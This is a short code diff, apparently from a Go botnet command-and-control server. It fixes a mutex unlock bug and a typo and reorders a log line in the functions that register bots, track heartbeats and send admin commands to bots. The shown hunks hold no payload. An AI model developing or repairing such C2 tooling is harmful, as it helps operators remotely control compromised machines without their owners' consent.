@@ -44,9 +44,9 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	c.RegisterBot(b.ID, &b)
 	b.Mu.Unlock()
 
-	fmt.Print("BOT ID: ", b.ID, "\nHOSTNAME: ", b.HostName, "\n OS: ", b.OS, "\nLASTSEEN: ", b.LastSeen, "\n")
-
 	go c.listentoBot(&b)
+
+	fmt.Print("BOT ID: ", b.ID, "\nHOSTNAME: ", b.HostName, "\n OS: ", b.OS, "\nLASTSEEN: ", b.LastSeen, "\n")
 
 }
 
@@ -81,7 +81,7 @@ func (c *c2) listentoBot(bot *models.Bot) {
 		case HEARTBEAT:
 			bot.Mu.Lock()
 			log.Println("Recieved Heartbeat From Bot : ", bot.ID)
-			bot.Mu.RUnlock()
+			bot.Mu.Unlock()
 		}
 
 	}
@@ -103,7 +103,7 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 				log.Println(err)
 				continue
 			}
-			fmt.Println("Command send to bot : ", v.ID)
+			fmt.Println("Command sent to bot : ", v.ID)
 		}
 	} else {
 		bot := c.GetBot(cmd.BotID)
@@ -111,7 +111,7 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 			log.Println(err)
 			return
 		}
-		fmt.Println("Command send to bot : ", bot.ID)
+		fmt.Println("Command sent to bot : ", bot.ID)
 	}
 
 } //send  execute command  message by admin
